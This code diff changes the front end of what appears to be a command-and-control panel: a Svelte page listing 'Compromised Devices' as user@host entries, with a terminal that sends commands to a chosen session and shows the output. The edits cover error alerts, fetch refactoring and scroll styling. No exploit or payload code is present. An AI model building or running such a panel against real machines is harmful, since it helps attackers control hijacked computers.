@@ -3,6 +3,11 @@
   import { enhance } from '$app/forms';
   import SplitPane from '$lib/components/SplitPane.svelte';
 
+  function clearResult() {
+        error = "";
+    }
+    let error = $state("");
+
   let stdout: HTMLElement;
   let inputEl: HTMLElement;
 
@@ -30,27 +35,30 @@
     }) {
         sid = device.sid;
         idle_s = `${device.username}@${device.hostname} >$`;
+        inputEl.focus();
     }
 
   onMount(() => {
     async function updateList() {
-      let res = await fetch('/api/devices', { credentials: "include" });
-      let json = await res.json();
-      pwns = json.devices;
-
-      res = await fetch('/api/session', { credentials: "include" });
-      json = await res.json();
-      stdout.textContent = json.output;
+        const res = await fetch('/api/devices', { credentials: 'include' });
+        const json = await res.json();
+        if (json.error) {
+            error = json.error;
+            setTimeout(clearResult, 5000);
+            return;
+        }
+        pwns = json.devices;
     }
 
     async function updateOutput() {
-      let res = await fetch('/api/devices', { credentials: "include" });
-      let json = await res.json();
-      pwns = json.devices;
-
-      res = await fetch('/api/session', { credentials: "include" });
-      json = await res.json();
-      stdout.textContent = json.output;
+        const res = await fetch('/api/session', { credentials: "include" });
+        const json = await res.json();
+        if (json.error) {
+            error = json.error;
+            setTimeout(clearResult, 5000);
+            return;
+        }
+        stdout.textContent = json.output;
     }
 
     updateList();
@@ -70,7 +78,13 @@
 <SplitPane>
   {#snippet topContent()}
     <div style="padding: 1rem;">
-      <h2>Compromised Devices</h2><hr>
+      <h2>Compromised Devices</h2>
+        <!-- Popup / alert area -->
+        {#if error}
+            <div class="alert alert-danger">{error}</div>
+        {/if}
+      <hr>
+
       <ul>
         {#each pwns as d}
             <li>
@@ -96,8 +110,7 @@
   {#snippet bottomContent()}
     <div class="terminal">
         <div class="stdout-area">
-            <p id="term-out" bind:this={stdout} class="stdout">
-            </p>
+            <pre id="term-out" class="stdout" bind:this={stdout}></pre>
         </div>
         <form method="POST" action="?/send" use:enhance={() => {
             return async ({ update }) => {
@@ -146,21 +159,28 @@
     .stdout-area {
         flex: 1;
         min-height: 0;
-        overflow-y: auto;
+        overflow: hidden; /* let .stdout handle the scroll */
         margin: 10px;
+        display: flex;
+        flex-direction: column;
     }
 
     .stdout {
+        flex: 1;
+        min-height: 0;
+        overflow-y: auto;   /* vertical scroll only */
+        overflow-x: hidden; /* no horizontal scroll */
         padding: 10px;
+        margin: 0;          /* pre has default browser margin — kill it */
         background-color: rgba(255, 255, 255, 0.05);
         color: #d4d4d4;
         border: 1px solid rgba(255, 255, 255, 0.1);
         border-radius: 4px;
         font-family: 'Courier New', monospace;
         font-size: 13px;
-        white-space: pre-wrap;
-
-        height: 95%;
+        white-space: pre-wrap;  /* preserves whitespace but wraps at container edge */
+        word-break: break-all;  /* breaks long lines (e.g. base64, paths) that would overflow */
+        box-sizing: border-box;
     }
 
     .stdin {
